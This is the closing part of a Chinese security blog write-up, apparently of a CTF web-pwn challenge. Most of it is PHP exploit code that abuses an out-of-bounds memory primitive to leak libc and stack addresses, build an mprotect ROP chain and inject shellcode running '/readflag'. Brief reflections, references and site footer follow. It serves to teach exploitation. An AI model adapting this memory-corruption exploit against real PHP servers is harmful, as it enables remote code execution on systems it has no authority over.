    $strlen_addr = read64($oob,$offset);
    $libc_base = $strlen_addr - 0x18b660;
    $pop_rdi = $libc_base + 0x0000000000026b72;
    $pop_rsi = $libc_base + 0x0000000000026b70;
    $pop_rdx = $libc_base + 0x0000000000162866;
    
    $stack_ptr = $libc_base + 0x1ec440;
    
    $offset = $stack_ptr - ($oob_self_obj_addr + 0x18);
    $stack_addr = read64($oob,$offset);
    $mprotect_addr = $libc_base + 0x11BB00;
    
    echo sprintf("strlen_addr=0x%lx \n",$strlen_addr);
    echo sprintf("libc_base=0x%lx \n",$libc_base);
    echo sprintf("stack_addr=0x%lx \n",$stack_addr);
    
    $offset = $stack_addr - ($oob_self_obj_addr + 0x18);
    
    
    
    $ret_main_target = $php_base + 0x51d402;
    //搜索ROP的地址
    while (true) {
       $data = read64($oob,$offset);
       //echo sprintf("0x%lx",$hackphp_so_addr & 0xFFF);
       //echo "\n";
       if (intval($data) == intval($ret_main_target) ) {
          echo "found!";
          break;
       }
       $offset--;
    }
    
    
    for ($j=0;$j<8;$j++) {
       $oob[$offset+$j] = chr($pop_rsi & 0xFF);
       $pop_rsi = $pop_rsi >> 0x8;
    }
    $offset += 0x8;
    $data = 0x1000;
    for ($j=0;$j<8;$j++) {
       $oob[$offset+$j] = chr($data & 0xFF);
       $data = $data >> 0x8;
    }
    
    $offset += 0x10;
    for ($j=0;$j<8;$j++) {
       $oob[$offset+$j] = chr($pop_rdx & 0xFF);
       $pop_rdx = $pop_rdx >> 0x8;
    }
    $offset += 0x8;
    $data = 0x7;
    for ($j=0;$j<8;$j++) {
       $oob[$offset+$j] = chr($data & 0xFF);
       $data = $data >> 0x8;
    }
    $offset += 0x10;
    
    for ($j=0;$j<8;$j++) {
       $oob[$offset+$j] = chr($pop_rdi & 0xFF);
       $pop_rdi = $pop_rdi >> 0x8;
    }
    
    
    $offset += 8;
    $stack_addr = $offset + ($oob_self_obj_addr + 0x18);
    
    $data = $stack_addr ^ ($stack_addr & 0xfff);
    for ($j=0;$j<8;$j++) {
       $oob[$offset+$j] = chr($data & 0xFF);
       $data = $data >> 0x8;
    }
    $offset += 8;
    $data = $mprotect_addr;
    for ($j=0;$j<8;$j++) {
       $oob[$offset+$j] = chr($data & 0xFF);
       $data = $data >> 0x8;
    }
    $offset += 8;
    $data = $stack_addr+0x18;
    for ($j=0;$j<8;$j++) {
       $oob[$offset+$j] = chr($data & 0xFF);
       $data = $data >> 0x8;
    }
    $stack_addr += 0x18;
    $offset += 0x8;
    
    $shellcode = "\x55\x48\x89\xE5\x48\x83\xEC\x30\x48\xB8\x2F\x72\x65\x61\x64\x66\x6C\x61\x48\x89\x45\xF0\x48\xC7\xC0\x67\x00\x00\x00\x48\x89\x45\xF8\x48\x8D\x7D\xF0\x48\xC7\xC6\x00\x00\x00\x00\x48\xC7\xC2\x00\x00\x00\x00\xB8\x3B\x00\x00\x00\x0F\x05";
    $len = strlen($shellcode);
    
    //写shellcode
    for ($j=0;$j<$len;$j++) {
       $oob[$offset+$j] = $shellcode[$j];
    }
    
    ?>
    

## 0x04 感想

第一次接触WEB PWN，突然觉得php语言的模块功能好灵活方便，WEB PWN也挺有趣。

## 0x05 参考链接

[ PHP 内核与扩展开发系列] PHP 生命周期 ——
启动、终止与模式](https://laravelacademy.org/post/7152.html)  
[PHP扩展之PHP的启动和停止](https://www.ligphp.com/post/75.html)  
[php7扩展开发 一 获取参数](https://www.cnblogs.com/dearmrli/p/6553542.html)  
[php-src](https://github.com/php/php-src/blob/ef5164818576d75929834d9f0c15cdfc095f7139/ext/opcache/jit/zend_jit_helpers.c)  
[PHP7 Memory
Exploitation](https://paper.seebug.org/papers/Security%20Conf/Hitcon/Hitcon-2016/1201%20R2%201500%20exploiting%20php7.pdf)

![](https://p4.ssl.qhimg.com/t0191eae3f5bdfd0f98.png)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **ha1vk@赛宁网安天虞实验室** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/233831](/post/id/233831)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [PHP](/tag/PHP)
  * [二进制安全](/tag/二进制安全)

 **+1** __11赞

 __收藏

![](https://p5.ssl.qhimg.com/t015704b4b2e374eb33.jpg) ha1vk@赛宁网安天虞实验室

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

